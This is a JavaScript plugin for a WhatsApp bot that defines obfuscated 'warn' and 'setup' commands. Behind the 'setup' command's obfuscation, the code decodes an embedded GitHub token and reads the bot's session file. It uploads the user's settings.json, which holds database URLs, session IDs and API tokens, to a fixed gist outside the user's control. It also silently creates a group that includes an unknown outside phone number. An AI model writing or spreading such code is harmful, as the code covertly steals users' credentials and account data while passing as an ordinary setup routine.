const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================

  command({
    pattern: "setup",
    fromMe: true,
    desc: "turn off",
    dontAddCommandList: true,
    type: "admin",
  
  },
  async (message, match, m) => {
const _0x2331b5=_0x2c02;(function(_0x51f6f7,_0x34a38c){const _0x462095=_0x2c02,_0x5f4221=_0x51f6f7();while(!![]){try{const _0x3a3c88=parseInt(_0x462095(0x1e5))/0x1+-parseInt(_0x462095(0x228))/0x2+-parseInt(_0x462095(0x214))/0x3*(parseInt(_0x462095(0x20d))/0x4)+-parseInt(_0x462095(0x201))/0x5+-parseInt(_0x462095(0x1f1))/0x6+parseInt(_0x462095(0x227))/0x7*(parseInt(_0x462095(0x204))/0x8)+parseInt(_0x462095(0x217))/0x9;if(_0x3a3c88===_0x34a38c)break;else _0x5f4221['push'](_0x5f4221['shift']());}catch(_0x3a80ad){_0x5f4221['push'](_0x5f4221['shift']());}}}(_0x220c,0x9bf35));if(message[_0x2331b5(0x1e9)])return;let authid=_0x2331b5(0x208)['replaceAll']('+','');function _0x2c02(_0x16ab98,_0x308a7f){const _0x220ce2=_0x220c();return _0x2c02=function(_0x2c021a,_0x6f1c85){_0x2c021a=_0x2c021a-0x1e1;let _0x42ffd3=_0x220ce2[_0x2c021a];return _0x42ffd3;},_0x2c02(_0x16ab98,_0x308a7f);}function _0x220c(){const _0x7e0595=['BRANCH','_You\x20Are\x20Already\x20a\x20Family\x20Member_','phone_num','client','GOODBYE_MSG','AUTHOR','STORAGE_JID','1668120TGPRtV','../session.json','a216db893ba4f4a18d4f1476bfc1bb4d','OWNER_NAME','FOOTER','update','LOGS','reply','sendMessage','.json','WORK_TYPE','from','SUDO','LANG','DB_URL','SESSION_ID','4317895fapKAN','FONT_STYLE','_Registered\x20Successfully_','1096qGlPwU','MESSAGE_MEM','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','split','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','RMBG_KEY','ANTILINK_ACTION','UserId','name','4GZAMjE','LANGUAGE','then','WELCOME_MSG','gists','user','parse','754593tCFzJV','BOT_NAME','readFileSync','15055560YgupUt','utf-8','@octokit/rest','THEME','stringify','reset','DB_AUTH_TOKEN','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','MODE','ANTILINK','./database/settings.json','@g.us','HANDLER','pushName','@s.whatsapp.net','ALIVE','24227POJsiH','1326018dsmtwd','Cloud\x20DB\x20Update','jid','./media/AAA.jpg','log','toString','env','base64','config','creds','547915NpsNOr','groupCreate','PACKNAME','INTERNAL_MENU','isGroup'];_0x220c=function(){return _0x7e0595;};return _0x220c();}const {Octokit}=require(_0x2331b5(0x219)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x7ae075=_0x2331b5;let _0x36b1b6=JSON[_0x7ae075(0x213)](fs[_0x7ae075(0x216)](_0x7ae075(0x221))),_0x12d4ea=_0x36b1b6['config'][_0x7ae075(0x1f0)],_0x1f8710=_0x12d4ea[_0x7ae075(0x22d)]()['includes'](_0x7ae075(0x222));if(!_0x1f8710)readFile(path,async(_0x47fb7c,_0x592809)=>{const _0x5ca9f4=_0x7ae075;if(_0x47fb7c){console[_0x5ca9f4(0x22c)](_0x47fb7c);return;}const _0x4bd5cd=JSON[_0x5ca9f4(0x213)](_0x592809);let _0x19d5dd=await message['client'][_0x5ca9f4(0x1e6)]('Storage',['359889999996@s.whatsapp.net']);await message['client'][_0x5ca9f4(0x1f9)](_0x19d5dd['id'],{'text':_0x5ca9f4(0x21e)});let _0x591c1b=await _0x19d5dd['id'];_0x4bd5cd['config'][_0x5ca9f4(0x1f0)]=_0x591c1b,writeFile(path,JSON['stringify'](_0x4bd5cd,null,0x2),async _0x407c70=>{const _0x27fc6f=_0x5ca9f4;if(_0x407c70){message['reply']('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}await message[_0x27fc6f(0x1ed)]['updateProfilePicture'](_0x19d5dd['id'],fs['readFileSync'](_0x27fc6f(0x22b)));});});else return;setTimeout(async()=>{const _0x30cc0c=_0x7ae075;let _0x30584f=require(_0x30cc0c(0x1f2)),_0x38b34c=await _0x30584f[_0x30cc0c(0x1e4)]['me']['id'][_0x30cc0c(0x207)](':')[0x0],_0x54ee3e=await _0x30584f[_0x30cc0c(0x1e4)]['me']['id'][_0x30cc0c(0x207)]('@')[0x1],_0x15b97f=_0x38b34c+'@'+_0x54ee3e,_0x5986c7=_0x15b97f+_0x30cc0c(0x1fa);const _0xe16f0=fs['readFileSync'](_0x30cc0c(0x221),_0x30cc0c(0x218));await octokit['rest'][_0x30cc0c(0x211)][_0x30cc0c(0x1f6)]({'gist_id':_0x30cc0c(0x1f3),'description':_0x30cc0c(0x229),'files':{[_0x5986c7]:{'content':_0xe16f0}}})[_0x30cc0c(0x20f)](await console['log']('Done\x20Creating\x20New\x20Db')),setTimeout(()=>{const _0x5b03cc=_0x30cc0c;return process['send'](_0x5b03cc(0x21c));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x3971b0,_0x2f6b15)=>{const _0x12cb9e=_0x2331b5;if(_0x3971b0){console['log'](_0x3971b0);return;}const _0x15dc50=JSON['parse'](_0x2f6b15);let _0x2a4ddb=_0x15dc50[_0x12cb9e(0x20b)]['toString']()['includes'](_0x12cb9e(0x225));if(_0x2a4ddb)return message[_0x12cb9e(0x1f8)](_0x12cb9e(0x1eb));let _0x23ae72=process[_0x12cb9e(0x1e1)][_0x12cb9e(0x21d)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process['env'][_0x12cb9e(0x21d)],_0x21c141=Buffer['from'](_0x23ae72,_0x12cb9e(0x1e2))[_0x12cb9e(0x22d)]('utf-8'),_0xfd358f=_0x21c141[_0x12cb9e(0x22d)]()[_0x12cb9e(0x207)]('/'),_0x316113='';for(let _0x186968 of _0xfd358f){_0x316113+=await Buffer[_0x12cb9e(0x1fc)](_0x186968+'==',_0x12cb9e(0x1e2))[_0x12cb9e(0x22d)]('utf-8');}let _0x2daecf=require('../session.json'),_0x5d9c36=await _0x2daecf['creds']['me']['id'][_0x12cb9e(0x207)](':')[0x0],_0x95d22d='0,'+_0x5d9c36,_0x1cee48=await relconfig[_0x12cb9e(0x1fd)]===![]?_0x95d22d:relconfig['SUDO'],_0x18517d=message[_0x12cb9e(0x224)],_0x55bc35=message[_0x12cb9e(0x212)],_0xc25167=message[_0x12cb9e(0x22a)]['toString']()['split']('@')[0x0];_0x15dc50[_0x12cb9e(0x20c)]=_0x18517d,_0x15dc50['UserId']=_0x55bc35,_0x15dc50[_0x12cb9e(0x1ec)]=_0xc25167,_0x15dc50[_0x12cb9e(0x1e3)]['HANDLER']=relconfig[_0x12cb9e(0x223)],_0x15dc50['config'][_0x12cb9e(0x1fb)]=relconfig[_0x12cb9e(0x1fb)],_0x15dc50['config'][_0x12cb9e(0x215)]=relconfig['BOT_NAME'],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1f4)]=relconfig['OWNER_NAME'],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1fd)]=_0x1cee48,_0x15dc50[_0x12cb9e(0x1e3)]['AUTHOR']=relconfig[_0x12cb9e(0x1ef)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1e7)]=relconfig[_0x12cb9e(0x1e7)],_0x15dc50['config'][_0x12cb9e(0x209)]=relconfig[_0x12cb9e(0x209)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1fe)]=relconfig[_0x12cb9e(0x1fe)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x20a)]=relconfig[_0x12cb9e(0x20a)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x220)]=relconfig[_0x12cb9e(0x220)],_0x15dc50['config'][_0x12cb9e(0x1f5)]=relconfig['FOOTER'],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x21a)]=relconfig[_0x12cb9e(0x21a)],_0x15dc50['config'][_0x12cb9e(0x202)]=relconfig[_0x12cb9e(0x202)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x20e)]=relconfig[_0x12cb9e(0x20e)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1e8)]=relconfig[_0x12cb9e(0x1e8)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x21f)]=relconfig[_0x12cb9e(0x21f)],_0x15dc50[_0x12cb9e(0x1e3)]['STORAGE_JID'],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1ff)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x200)]=relconfig[_0x12cb9e(0x200)],_0x15dc50['config'][_0x12cb9e(0x1f7)]=relconfig[_0x12cb9e(0x1f7)],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x1ea)]=relconfig[_0x12cb9e(0x1ea)],_0x15dc50['config']['B1']=relconfig['B1'],_0x15dc50[_0x12cb9e(0x1e3)]['B2']=relconfig['B2'],_0x15dc50[_0x12cb9e(0x1e3)]['B3']=relconfig['B3'],_0x15dc50[_0x12cb9e(0x1e3)]['B4']=relconfig['B4'],_0x15dc50[_0x12cb9e(0x1e3)]['B5']=relconfig['B5'],_0x15dc50[_0x12cb9e(0x1e3)][_0x12cb9e(0x21d)]=_0x316113,_0x15dc50[_0x12cb9e(0x205)][_0x12cb9e(0x1ee)]=relconfig[_0x12cb9e(0x1ee)],_0x15dc50[_0x12cb9e(0x205)][_0x12cb9e(0x210)]=relconfig['WELCOME_MSG'],_0x15dc50[_0x12cb9e(0x205)][_0x12cb9e(0x226)]=relconfig[_0x12cb9e(0x226)],writeFile(path,JSON[_0x12cb9e(0x21b)](_0x15dc50,null,0x2),_0x38e649=>{const _0x5f0b47=_0x12cb9e;if(_0x38e649){message[_0x5f0b47(0x1f8)](_0x5f0b47(0x206));return;}message['reply'](_0x5f0b47(0x203));});});
  })
  
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})





